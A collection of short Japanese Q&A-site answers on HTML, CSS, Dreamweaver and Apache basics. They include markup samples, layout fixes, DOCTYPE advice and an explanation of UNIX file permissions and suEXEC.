うーん、私も1時間以上悩んでしまいました（汗 どうやら、原因は2つあったようです。 [原因1] #hpb-container に clearfix が指定してある container_10C_2c_topleft.css に、『#hpb-container:after{…}』の部分があると思います。（42～48行目辺り） このスタイル指定を入れた意図はわかりませんが、私が見る限りは不要だと思います。 しかも、これがあることによって、フッターに余白を作ってしまっています。 これは削除していいと思います。 [原因2] geocities の画像型アクセス解析がページ下部に存在している geocities には、ページの最後に 1px×1px の画像を埋め込んで、アクセス解析をする機能があるようですが、 これがある為に、ページ下部に隙間ができてしまっています。 この画像を見えなくするために、以下の CSS をどこかに追加しましょう。 body > img {display:none;} （尚、画像を見えなくするようにしても、画像のリクエストは飛ぶので、アクセス解析に影響が出ることはありません。） 以上の2つを直せば、フッターはページ下部に密着します。 ご参考になれば幸いです。
>DWで作るとソースも手打ちより汚く、管理とトラブルシューティングが行いにくくなり、CSSでなく属性を使っていて、共通のCSSにしたいところもならず、適切なタグを使わないというイメージがあるのですが、そのような問題はあまりないないしは重要ではないのでしょうか？ それは、ただ単なるイメージであり、真実ではありません。Dreamweaverを毎日のように使っていますが、手打ちで作るのと同等に綺麗なソースに効率よくマークアップできています。使いかたが悪いのでは？と思います。機能があるからといって、その機能を絶対に使わないといけないわけではないですし、カスタマイズもできますよ。適切なタグを使わないのは、チューニングができていない、ソフトの癖をまだ飲み込めていないからかなと思います。 websaitojisakuさんってデザイナーの修行を行っているのですよね？なんだか、コーダーのような質問ばかりですね。
http://www.rakutenshop-omakase.com/qa/css.html 理由はこれ。 だから楽天でのショップデザインができる人は重宝されます。 そこそこの限定的のノウハウが必要だからです。
ＣＳＳを無視と言っていながらＣＳＳを使っていますよ。 ＣＳＳが働かないような設定があって、 <table style="border-style:none;" style="width:200px;" "height:500px;"> が無効になっていませんか？ htmlなら、<table border＝0 width=200 height=200> になると思うけど。
こんばんは。 動画のことよくわからないけど、 詳しい情報はやっぱ iphoneについてのフォラムに聞きに行ってみて、 そこでいろいろ専門家がいますから
Sight とかどうですか？ 人気のようですし、よく質問されてるのを見かけます。 「自分で作れる！おしゃれなWebサイト」って本にも やり方がのってました。
それは、IEの仕様でして・・・ firefoxやOperaはウィンドウ中央に、IEやGoogleChromeは左上に表示されます。 <a href="abc.html">とでもして、HTML内に画像を配置するか、javascriptで新しいウィンドウをサイズを指定して開くかになります。
フォトショップですね。 ロゴや背景はイラレでＧＩＦ画像にして、写真なんかはフォトショップで加工してＪＰＧにしますね。 バナーはフラッシュという選択肢もありますが、写真重視のバナーならフォトショップ、イラストが多いければイラレですね。 私はロゴはイラレで作っています。それをＰＳにもっていってＰＮＧに変換する。 イラレ、フォトショはバランスよく使ったらいいですよ。 ＭＤＮで検索したら、いい本が出てくると思います。
Yahoo(YST)は２年前頃だったか？廃止になりまして、 現在はGoogleエンジンを間借りしています。 つまり、 Googleに申請すれば、Yahooにも出てきます。
　FC2はわかりませんが、IEと他の標準ブラウザで差が出る場合、もっとも疑わなければならないのは、IEが互換モードで動作している可能性です。 　IEは、かってユーザーの取り込みと他のブラウザを排斥するために独自の仕様を取り入れていました。その後IEもウェブ標準に倣うことになりますが、かってのIEのために作られたページを表示するために「互換モード」をもっています。 　そのIEを標準モードで動作させるためには、DOCTYPEを適切に記述する必要があります。 [HTML4.01strict]でしたら、 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> と書くことで、Mac用IEも含めて標準モードで動作します。 　⇒doctypeスイッチ - Google 検索 ( https://www.google.co.jp/search?q=doctype%E3%82% … ) （現状ではHTML4.01strictがもっとも良いでしょう。transitinalではありません。） 　また、当然ですが、 『メモ: CSSスタイルシートを意図した通りに機能させるには、正しい文書解析木が必要です。つまり、正当なHTMLを用いるべきです。( http://jigsaw.w3.org/css-validator/#validate_by_ … )』 　もとても重要です。正しく書かれていないHTMLの場合、ブラウザは何とか表示しようと適当に補完して表示を試みます。その方法はブラウザごとに異なるため、差が出てしまいます。 　スタイルシートを書き始める前に 　⇒Another HTML-lint 5 ( http://www.htmllint.net/html-lint/htmllint.html ) でチェックしておく癖をつけましょう。 ・<ul>内に<br>や<a>は入ることは出来ません。 　<ul>内に存在しうるのは<li>のみです。 ⇒<!ELEMENT UL - - (LI)+ 　( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) と書かれているのは、--(前後のタグを省略できない、(LI)がひとつ以上 　と書かれています。 　また<br>は通常のHTML文書には登場しません。「ひとつの段落でありながら改行する」という強制改行です。間隔を広げるために使用するものではありませんし、段落を示すものではありません。 ※先日書いたサンプルが、こちら( http://oshiete.goo.ne.jp/qa/8246537.html )の回答No.2にあります。 　DOCTYPEを上記に変更して、HTML4.01strictに変更し 　そこで示した示したスタイルシートを次に書き換えてみてください。 　() div.header,div.section,div.footer{ width:90%;min-width:620px;max-width:1000px; margin:0 auto; padding:5px; } div.section{position:relative;min-height:400px;} div.section div.nav,div.section div.aside{/* 子孫セレクタ */ position:absolute;top:0; width:200px;height:100%; } /*div.section div.nav{left:0;}*/ div.section div.nav{height:200px;bottom:10px;position:fixed;top:auto;} div.section div.aside{right:0;} div.section h2,div.section div.section{ margin:0 210px; } div.section div.section{ width:auto;min-width:0;min-height:200px; margin:0 210px; } /* たったこれだけ!---おまけに分かりやすく色分け */ body{background-color:gray;} div.header{background-color:aqua;} div.section{background-color:silver;} div.section div.section{background-color:white} div.section div.nav{background-color:yellow;} div.section div.aside{background-color:lime;} div.footer{background-color:fuchsia;} 　
HTMLlint は文法チェックしかしないから, 「<dd>もセットにしてつかわないと、不適切な記述になります」なんてことはない＞#4.
下記にある最近の投稿が参考になりませんか。 こちらは、ＵＲＬをリンク表示するようになっていますが、 ボタンが良いのであれば、変更してください。 参考URL：http://qa.itmedia.co.jp/qa8239595.html
RewriteEngine On RewriteCond %{REMOTE_ADDR} aaa.bbb.ccc.ddd [OR] RewriteCond %{REMOTE_ADDR} eee.fff.ggg.hhh RewriteRule .* /hoge.html [R=301,L] って感じで設定をBasic認証の設定の前に追加してみてはどうでしょう。
理屈は、CSS背景画像を表示しつつ、 h1内のテキストを表示しない（見えないところに飛ばす）って事。 <h1>画像置換えだよ</h1> h1{ text-indent: -9999px; width: 800px; height: 100px; background: url(～～.jpg) no-repeat; }
初期化用CSSなんて使わないほうが無難ですが・・ p要素の幅が狭くなると、imgの縦幅もつれて小さくなるため、親要素のline-heightが勝るだけかと・・ ＞mg（width:100%）をh1タグで括っているのですが、iPhoneで検証してみると、pタグ内に余白ができて しまいます。 　意味不明です。 <h1><img src="" width="" height="" alt="タイトル"></h1> だとして、 h1 img{width:100%;height:auto;} だと、幅が小さくなると余白がでて当然ですよ。
>No.3回答 >No.3お礼 一応補足しておきます。 <section>でレイアウトが可能というのは、 スタイルシートで div {position: absolute; width: 50%; right: 0;} このように書けば<div>を右寄せする事が可能ですが、 section {position: absolute; width: 50%; right: 0;} このように書けば<section>を右寄せする事が可能だというだけです。 レイアウトを目的として<section>を使うのではなく、 sectionは「セクション（和訳すると章や節など）」の区切りのために使用し、レイアウトを行う場合は上記の様にスタイルシートで指定してください。 また、たとえばナビゲーションには<nav>を使用し、<nav>のレイアウトを変更したいのであれば<nav>に対してスタイルシートを適用してください。（つまり、<nav>のレイアウトを目的として<section>の入れ子にしない。） 再度書きますが、 sectionでもレイアウトできる（sectionにスタイルを適用できる）ものを、わざわざスタイルシートを適用するためだけに<div>の入れ子にする必要はありません。 しかし、ブラウザのサポート状況を理由にわざわざ<div>の入れ子にする方が良い事もあります。
ご利用のブログで動くか分かりませんが、普通のHTMLファイルとしては 動作確認済みです。 動画のコードのところは、YouTube動画URLのＶ＝　の部分を入力すれば 最初から大画面で開きます。 ブログのウィンドウは残し、別ウィンドウで開くようにしていますが、 必要なければ、window.open().を切り取ってください。 <form> <select onchange="window.open().location.href = value"> <option value="#" selected>動画選択</option> <option value="http://www.youtube.com/v/動画のコード">動画１</option> <option value="http://www.youtube.com/v/動画のコード">動画２</option> ・・・ </select> </form>
http://www.openspc2.org/reibun/AdobeAIR/1.5/Java … Javascriptならこんな感じでできるそうね。 ただ、それなりに重そう。 やりたいことは 特定のディレクトリ内にある規則性のある画像全てを、imgタグを使ってブラウザに出力したい。 かな？ 言語は何でもいいなら、PHPでやってみたらどうでしょ？ 特定のディレクトリにある全てのファイル名を取得して 必要があればソートして imgタグと合わせてHtml出力 要らないものを出力してから見えなくするより、 要らないものなら最初から出力しない方がスマートで私は好きですね。
1.素材を用意する。 2.映像編集ソフトで加工する 以上。
　質問の意味が分からないのですが、ページと言うと単一のページとして表示されるものを言うとしたら、「１つのhtmlファイルで実現する」とうまく整合しないのですが？？？？。 　ひとつのHTML(大文字)に他のHTMLを表示させるには、iframeという手法がありますが、HTML フレーム 問題( https://www.google.co.jp/search?num=30&safe=off& … ) を持っていますから、「googleのクローラーには、それぞれのページが登録される」ということはありません。 　それぞれを個別に登録されたいのでしたら、ひとつの画面(ひとつのURL)に表示することは不可能です。 　ランディングページ、もしくはグループのトップ--いわゆるそのサイトのホームページ---をひとつ作成して、そこからのリンクで各ページにリンクさせることになります。 　それぞれのページのURLはPATH_INFOでもQUERY_STRINGでも良いです。QUERY_STRINGの場合は、サーバー側で動的にページを作成する必要があります。PATH_INFOの場合は、個別ファイルでも動的に生成しても良いです。 　http：//hoge.group/ だとサイトのトップへ 　http：//hoge.group/tarou/ だと太郎さんのサイトへ 　http：//hoge.group/hanako/ だと花子さんのサイトへ 　http：//hoge.group/jirou/ だと次郎さんのサイトへ あるいは、 　http：//hoge.group?tarou だと太郎さんのサイトへ 　http：//hoge.group?hanako だと花子さんのサイトへ 　http：//hoge.group?jirou だと次郎さんのサイトへ と言う風に・・
ttp://www.shoshinsha.com/hp/ref/css/css_exp.html スタイルシートとは ttp://www.shoshinsha.com/hp/ref/css/line-height.html 行間の調節 CSS line-height: ネットではヒントを貰ったらドンドン 検索していけばより良い結果が得られますよ
ふつうに、 <body style="background-image:url(画像のURL)"> 　※background属性は非推奨ですし、後で説明するフォームのコントロールに背景を透明にすることは出来ません。 　⇒ http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … あるいは、HEAD内にbackground-image:url();でよいですが・・ テキストボックスにも背景を指定したいと言うことでしょうか？ 　その場合は、textarea,input{background-color:transparent;}です。 ＞特別なやり方（HTMLの書き方）があるのでしょうか。 　HTMLには文書構造しか書きません。 　どのようにプレゼンテーションするかは、スタイルシートで指定します。 [サンプル] ※Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html# ) 　で検証済みのHTML4.01+CSS2.1 ※タブは＿に置換してあるので戻す。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- body{background-image:url(./images/background/stone.jpg);} textarea,input,select{background-color:transparent;} input[type="submit"]{background-color:yellow;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<form action="./"> ＿＿＿<p><textarea cols="50" rows="4" name="text" tabindex="1" accesskey="t">テキスト</textarea></p> ＿＿＿<p><input type="text" size="30" name="aaa" value="" tabindex="2" accesskey="m"></p> ＿＿＿<p><select name="sel" tabindex="3"> ＿＿＿＿<option selected>ABC<option>EFG<option>HIL ＿＿＿＿</select> ＿＿＿</p> ＿＿＿<p><input type="submit" value="送信" tabindex="4" accesskey="s"></p> ＿＿</form> ＿＿<p>・・・</p> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
通常はtableでレイアウトします。HTML的--文書構造--にもtableのほうが良いです。
selectのrequiredオプションは、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから If a select element has a required attribute specified, does not have a multiple attribute specified, and has a display size of 1; and if the value of the first option element in the select element's list of options (if any) is the empty string, and that option element's parent node is the select element (and not an optgroup element), then that option is the select element's placeholder label option. ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［4.10 Forms — HTML5( http://www.w3.org/TR/2012/CR-html5-20121217/form … )］より ・multiple属性が指定されていないこと ・size(表示サイズ)が 1 であること ・option 要素の値が空文字列であること ・その option 要素の親ノードが select 要素であること 　★optgroupはダメ と書かれています。よって送信されるはずです。 　<select name="sample[]" required> 　　<option value="">選択してください。</option> 　　<optgroup label="カテゴリA"> 　　　<option value="1">選択肢１</option> 　　　<option value="2">選択肢２</option> 　　</optgroup> 　　<optgroup label="カテゴリB"> 　　　<option value="3">選択肢３</option> 　　</optgroup> 　</select> なお、IE8以前のものは、requiredオプションが無効ですので、javascriptで判断すると同時に、CGI側での処理をする必要があります。 　⇒Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html ) などで文法チェックをしてみたら？？
上手くできてよかったです 追質問についてですが、 #std tabke{ これは　<div id="std">～</div>間でのtableという意味です ですから、他の位置に別のtable、文字、画像などを追加する場合は、 例えば、 #std img{ 画像 #std p{ 文字 #std2 tabke{　　　テーブル こんな感じです
まずＣＳＳで #link1 a:hover { color:#ff0000; } #link2 a:hover { color:#0033cc; } #link3 a:hover { color:#00ffff; } あとは <div id=link1><a href="index.html">1</a></div> <div id=link2><a href="index.html">2</a></div> <div id=link3><a href="index.html">3</a></div> いかがですか
文法がおかしいかIE10がおかしいかしか考えられないですが。 ほかに理由なんて無いでしょう。
テレビはあくまでテレビなので「リアルタイム」は不可能ですね。 というか、できないからストリーミング配信があるわけだし、できるならPCでTVを見るためのチューナーやらの存在意義無いですよね。
「頭がよい人」は目的や環境で使い分けますが、「頭がよさそうな人」はHTML4.01よりも厳密であるXHTMLで書いてあるほうが「頭がよさそうに見える」のでXHTMLを使うのでしょう。 そして、「頭が凄くよさそうな人」はHTML5とCSS3を使うのです（笑）
ANo.1です。 <お礼より> いえ、不快に思っているわけではありません。 書く限りには少しでもプラスになれば、という思いです。 逆に私の書き方が稚拙だったのだと思います。失礼致しました。 近日中は無理でしょうが、本当に実現したいのであれば、 html、Javascript、php、MySQLをトータルで身につける必要があるでしょう。 以上は例ですが、別のソフトの選択も有り得ます。 上記ソフトの場合、xamppがセットで用意されて便利です。 また、別にインターネットとは？サーバとは？の学習も必要に思えます。
HTMLには文書構造しか書かないので、これはHTMLと言うより「Webデザイン・CSS( http://oshiete.goo.ne.jp/category/258/#crumb )」向きの質問ですね。 　HTML上はその部分はfooterにあたる部分ですから、以下のようにマークアップすればよいです。 ・・・前略・・・ 　<div class="section"> 　・・・【中略】・・・ 　　<ol id="siteMap"> 　　<li>個人のお客様 　　　<ul> 　　　　<li>パソコン、タブレット、<br>スマートフォン、携帯電話</li> 　　　　<li>カラー イメージ スキャナ</li> 　　　　<li>エアコン、家電製品</li> 　　　</ul> 　　</li> 　　<li>法人のお客様 ・・・【中略】・・・ 　　</li> 　　<li>お知らせ 　　　<ul> 　　　　<li>プレスリリース</li> 　　　　<li>製品安全に関する重要なお知らせ</li> 　　　</ul> 　　</li> 　</ol> </div> <div class="footer"> 　<ul> 　　<li>このサイトについて</li> 　　<li>個人情報保護ポリシー</li> 　　<li>お問い合わせ</li> 　　<li>サイトマップ</li> 　</ul> </div> ★このマークアップの理由 1) DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加する( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 2) class名は、HTML5の「3.1. 新しい要素( http://standards.mitsue.co.jp/resources/w3c/TR/h … )」の要素名と使い方 3) 構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　これをスタイルシートでデザインして行きます。この様なよいデザインを見つけたら、それを実現するためにCSSを書いていくことはとてもよい練習になります。 ★まず、文書構造からどの要素についてデザインするかを指定するセレクタ(選択子)( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … )の書き方や値の割り当て、カスケード処理、継承( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … )をしっかりと身につけます。 ★その後、プロパティで指定していきます。 [サンプル] ★タブは＿に置換してあるので戻す。 ★細かい指定はしていません。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- ol#siteMap,ol#siteMap li,ol#siteMap li ul,ol#siteMap li ul li{ list-style:none;display:block; margin:0;padding:0; text-align:center; } ol#siteMap:after{ content:"";display:block;clear:left; } ol#siteMap li{ width:23%; float:left; line-height:2em; } ol#siteMap li ul{ border-top:solid 1px gray; width:85%;margin:0 auto; line-height:1.4em;font-size:0.9em; } ol#siteMap li ul li{ width:100%; float:none; text-align:left; } div.footer{ background-color:gray;color:white; } div.footer{ font-size:0.8em; position:relative; height:20px; padding:5px; } div.footer ul{ margin:0; } div.footer ul li{ list-style:none; display:inline; margin-left:1em; } div.footer address{ position:absolute; right:5px;top:0px; } --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<p>・・・</p> ＿＿<ol id="siteMap"> ＿＿＿<li>個人のお客様 ＿＿＿＿<ul> ＿＿＿＿＿<li>パソコン、タブレット、<br>スマートフォン、携帯電話</li> ＿＿＿＿＿<li>カラー イメージ スキャナ</li> ＿＿＿＿＿<li>エアコン、家電製品</li> ＿＿＿＿</ul> ＿＿＿</li> ＿＿＿<li>法人のお客様 ＿＿＿＿<ul> ＿＿＿＿＿<li>ソリューション＆サービス</li> ＿＿＿＿＿<li>コンピュータプラットフォーム</li> ＿＿＿＿＿<li>ソフトウェア</li> ＿＿＿＿</ul> ＿＿＿</li> ＿＿＿<li>サポート情報 ＿＿＿＿<ul> ＿＿＿＿＿<li>サポート</li> ＿＿＿＿＿<li>よくあるご質問</li> ＿＿＿＿</ul> ＿＿＿</li> ＿＿＿<li>お知らせ ＿＿＿＿<ul> ＿＿＿＿＿<li>プレスリリース</li> ＿＿＿＿＿<li>製品安全に関する重要なお知らせ</li> ＿＿＿＿</ul> ＿＿＿</li> ＿＿</ol> ＿</div> ＿<div class="footer"> ＿＿<ul> ＿＿＿<li>このサイトについて</li> ＿＿＿<li>個人情報保護ポリシー</li> ＿＿＿<li>お問い合わせ</li> ＿＿＿<li>サイトマップ</li> ＿＿</ul> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
html は、<p>にされたほうがいいと思います。 <p>あああああああああああ。</p> <p>いいいいいいいいいいいいい<br> いいいいいいいいいいいいい。</p> <p>ううううううううう。</p> cssは、ｐ内の改行はline-heightで、段落の区切りでは、paddingやmarginで指定するのが定石です。 p{ line-height:1.2;/*段落内*/ padding-top:3em;/*段落と段落の間*/ }
デザインビューは効率よくコーディングするためツールで、確認用途のものではありません。 確認にはライブビューやブラウザ、スマートフォンを使います。 バグではありません。使い分けを。 デザインビューの基本的な使い方は、以下を参考にどうぞ ★デザインビューもできる子 http://oshare.jugem.cc/?eid=767 ★第1回：デザインビューは使えない？ http://www.atmarkit.co.jp/fwcr/design/tool/dw01/ … 他にも、カスタマイズすることでもっともっと便利になります。
<a href=""></a>じゃなくて<a name="aaa">あいうえお</a>ですよ。 <a name="bbb"></a>は、内容がありません。内容は必須です。 リンクの基点は<a href="#ccc">CCCへ</a>と書きますが、これも内容がないとクリックできません。 ※なお、デザインや配置のためにtableを使用するのは間違いです。 <td id="aaa">ＡＡＡ</td> がターゲット <a href="#aaa">AAAへ</a>が基点でもよい。
メタデータとは、コンピューターに伝える情報です。画面には表示されないが、ブラウザはそれを処理する。 　<meta>で示すのは、メタ情報のうちHTMLの仕様で定めのないものであって、定めのあるもの<title><style><script>となどは、そのままで良いです。 　メタタイトルとは、<title></title>のことですよ。ブラウザは、これを処理してウィンドウのタイトルバーに表示します。検索エンジンは素のページのタイトルとしてこれを表示します。またブックマークすればそれがタイトルとして利用されますから、ユーザーが一目でそのページの内容がわかるようなものを付ける必要があります。 　メタディスクリプションもメタキーワードも検索エンジンはまず利用していません。ここに嘘を書いて誘導しようとする著者があまりに多いため、今後も利用される可能性はないでしょう。本文記事を要約して表示することが多いです。 　書くのなら正確に、本文と齟齬があれば逆にスパムとしてはじかれる危険性が高いだけです。 　
＞Apacheサーバーへのアクセスは ＞1 FTPソフトでプロトコルFTPでFTPサーバにアクセスしているケース ＞2 ブラウザでプロトコルhttpでwebサーバーにアクセスしているケース ＞があると思います。 「FTPサーバ」が何なのか理解していますか？ FTPサーバとは、ftpデーモンが起動されていて、外のFTPクライアントからの要求に応答出来るサーバの事です。サーバ内のファイルへのアクセスはftpデーモンが行います。 この場合、Apacheは一切関与しません。 「WEBサーバ」が何なのか理解していますか？ WEBサーバとは、Apacheなどのhttpデーモンが起動されていて、外のWEBクライアント（ブラウザ）からの要求に応答出来るサーバの事です。サーバ内のファイルへのアクセスはApacheなどのhttpデーモンが行います。 この場合、ftpデーモンは一切関与しません。 ＞それぞれのケースで、アクセスしてきたのはaaaさんであるかどうかをApacheがどのようにして判断しているのか教えてください。 Apacheは何も判断しません。 Apacheは、設定ファイルに指定されたユーザーで実行し、ファイルにアクセスしに行くだけです。 この時、suEXECがインストールされていると、CGI/SSIを実行する前にsuEXECが呼び出され、suEXECが「そのCGI/SSIを実行すべき適切なユーザー（例えば、aaaさん）にユーザーを切り替えて」、CGI/SSIを実行します。 質問者さんは「アクセスしてきたのは○○さん」と言う概念を持ち出しますが、そういう概念は適当ではありません。間違っています。 UNIXの世界は「プロセス（ApacheやftpデーモンやsuEXECなど）は、自分を実行しているユーザーが、そのユーザーの権限でファイルシステムにアクセスする」って言う仕掛けになっています。 実行されているプロセスごとに「このプロセスは、誰々さんの権限を持って動いています」ってのを保持しているのです。 Windowsでも、タスクマネージャーの「プロセス」の所を見ると、プロセスごとに「誰が起動したか」つまり「誰々の権限を持って動いているか」が表示されます。 各プロセスが「ファイルにアクセスするとき」は「実行しているユーザーの権限を持ってファイルにアクセスするだけ」なのです。 アクセスに成功するか失敗するかは、UNIXシステムが判断します。 ＞FTPソフトでアクセスするケースではID・パスワードを入力してログインしたときにこちらの名前(aaaなど)をApacheサーバーに伝達しているのでしょうか？ Apacheサーバーに伝達なんかしません。 外のFTPクライアントからアクセスがあると、常駐していたftpデーモンが応答し、クライアントにログイン（ユーザー名とパスワードの入力）を求めます。 クライアントからユーザー名とパスワードが送られて来たら、ftpデーモンは、UNIXシステムに「このユーザーは、このパスワードで合っているか？」を問い合わせます。 ユーザー名とパスワードが合っていれば、自分自身の実行者をログインユーザーに切り替えて、あたかも、そのユーザーがftpデーモンを起動したかのような状態になって、ファイルシステムにアクセスします。 UNIXのファイルシステムは、ファイルへのアクセスに対し、実行ユーザーとファイルのパーミションに問題が無いか調べ、問題が無い時だけアクセスを許します。 ＞>そのプロセスが「file1」を「Readのみ」でオープンしようとしています。 ＞ブラウザでプロトコルhttpでwebサーバーにアクセスしているケースでは、 だ～か～ら～、ブラウザはサーバー内のファイルには一切アクセスしませんってば。 サーバー内にアクセスしているのは、httpデーモンであるApacheですよ。何度言ったらわかるの？ ＞ブラウザからサーバー内のファイルに向けて[Read]または[Write]または[Execute]の要求を出しているのでしょうか？ ブラウザはサーバー内のファイルには一切アクセスしませんって。なので、この質問は意味不明。 ＞サーバーにログインされることなしに勝手にサーバーのファイルを書き換えられるのが怖いのですが 「WEBページ上で、WEB利用者が自分自身の登録情報を変更する」って場合は、ユーザー情報が入ったファイルは「誰かが書き込み権限を持っている必要」があります。 この時「登録情報変更用のCGIがあるページ」をブラウザで開けるかどうかは「ApacheやUNIXシステムは一切関知しません」ので、ブラウザでそのページに辿り着けるかどうかは、WEBページ作成者の責任になります。 「ログインページを設けて、本人しか入れないようにする責任」は、WEBページ作成者にあります。 suEXECが無い環境では、Apacheや、Apacheから起動されたCGIやSSIは「nobody」など、規定のユーザーで実行されます。ですが、WEBスペース上のファイルは、所有者がnobodyにはなっていません。 でも、前述のように「ユーザー登録情報に書き込みに行く権限」は必要です。 nobodyがWEBスペース上のファイルに書き込みに行くには、パーミションが「606」のように「その他にwが必要」です。 この時、CGIを書き間違えれば、他人が所有するファイルにアクセスしに行っちゃって、他人のファイルを書き換えちゃう可能性が出てきます。 それを防ぐのがsuEXECの役目です。 ＞htmlファイルのパーミッションが606の時に、 基礎から勉強しなおして来てくださいって言いましたよね？ なので、ここ以下の補足質問には答えません。基礎から勉強しなおして来れば理解できる事ばっかりですから。
背景画像のURLが変更される。 画像のHTTP応答ヘッダにno-chashが指定されている。 HTTP要求、応答を確認してみましょう。
こんにちは。 style="height:960;" ではなく style="height:960px;"ではないでしょうか。 こちらを参考にしてみてください。単位が必要です。 http://w3g.jp/others/data/doctype_switching
こんな感じでいかがでしょう？ http://ambergris.hateblo.jp/entry/2012/09/25/112 … 他には、別ファイルとして管理していても、ページ表示時にはそれを合わせて表示するSSIという方法もあります。 http://www.tohoho-web.com/wwwssi.htm ※SSIはサーバーが対応している必要があります。 ただ、iPhoneだけなら何とかなるとは思いますが、 iframeにしてもoverflow:hidden;にしても、Androidは基本的にページ内スクロールには対応していないので Androidをバッサリ切り捨てる事になります。 Androidにも対応した形で似たようなことをやるには、「スクロール」ではなく「フリック」に対応させた形で作るしかないですが、 これはjavascriptを使用する必要があります。 自分で作らなくても、そういうのを公開しているサイトがあるので探して使用するといいと思いますが、 文中のリンクが効かなかったり、PCでの操作性が変な感じになったりと、全てにおいて完璧なものは今はありません（多分）ので、多少自分が実現したい事に合わせて改造が必要になると思います。 こういう場合は、PCに合わせて表示させる方法を考えるよりも、 そもそも本当に別ファイルでいいのか、という所からページの運用方法を考えないといけません。 個人的には使いたい部分が新着情報のみで、別ページとしてアップしているなら、 RSSのフィードを生成し、それを読み込んで使用するのが一番スマートだと思いますけどね。 5件なら5件表示させて、続きは別のページに誘導する、と。 phpがわからないと厳しいかもしれませんが。
情報が少なすぎます。 開発中のシステムですか？(画像とか載っけていいのでしょうか……) それとも稼働中のシステムですか？ > 画面のソースを見ますと、IEが表示処理を中断しているようです。 このように判断した根拠は何ですか？ サーバーからのレスポンスは正常に返ってきているということですか？ ・サーバー側に原因があるのか、それともクライアント側に原因があるのか ・ブラウザの種類・バージョンに依存する問題か ・Ajax使用の有無 などの観点から原因の切り分けを行うといいかと思います。
>> 原因ってわかりますか？ こういう場合は不要なものを排除して考えるのよ ボディタグの中で<div>～</div>等をどんどん削除すると <body> ​​ <div id="box_003"> <p>フッター</p> </div> </body> こうなるわね すると、一目瞭然 ブロック要素である<div>の直前にスペースがあるから その行が1行追加されてしまっているのね
通信制限が掛かってるからではありませんか？ 月間1GB～7GBの制限の他に、直近3日で数百MBの制限があるキャリアがあります。 128kbps以下でもダウンロード速度が再生速度に追いつけるように（むしろ制限が掛からないように）、 スマホ用のファイルを用意しておくのが無難だと思います。
<body> <div style = "text-align:center"> <input type="submit" value="＜＜ 戻る ＜＜" /> <span style="margin-left:100px"><input type="submit" value="選択リセット" /></span> <span style="margin-left:100px"><input type="submit" value="＞＞ 進 む＞＞" /></span> </div> </body> とりあえず適当に書きました。インデントきると改行でおかしくなるので、つけてません。 はっつけて実行してみてください。
XML における空要素タグの定義では、スペースは有っても無くても有効です。 http://www.w3.org/TR/REC-xml/#NT-EmptyElemTag XML の応用である XHTML1 の定義も同様ですが、 互換性の為にスペースを入れろと案内があります。 http://www.w3.org/TR/xhtml1/#h-4.6 http://www.w3.org/TR/xhtml1/#guidelines これは推測するに、質問の(2)(3)のケースを想定している為でしょう。 XML とは関係のない HTML5 では、そもそも空要素タグの閉じスラッシュ自体が不要なので、書いても意味はないと定義されています。(必要なケースも存在しますが) http://www.w3.org/TR/html5/syntax.html#start-tags これは推測するに、XHTML5 文書との運用性を考慮しているためでしょう。 というわけで質問者様が X のつかない HTML の質問をなさっているならば、 　そもそもスラッシュが不要 　なんらかの理由でスラッシュを書くならば、スペースは任意 　更に古い環境を考慮する特別な理由があるならば、スペースは必要 XHTML の質問をなさっているならば、 　スラッシュは必要だがスペースは任意 　XHTML を理解できない古い環境を考慮するなら、そもそもXHTMLなんてやめなさい
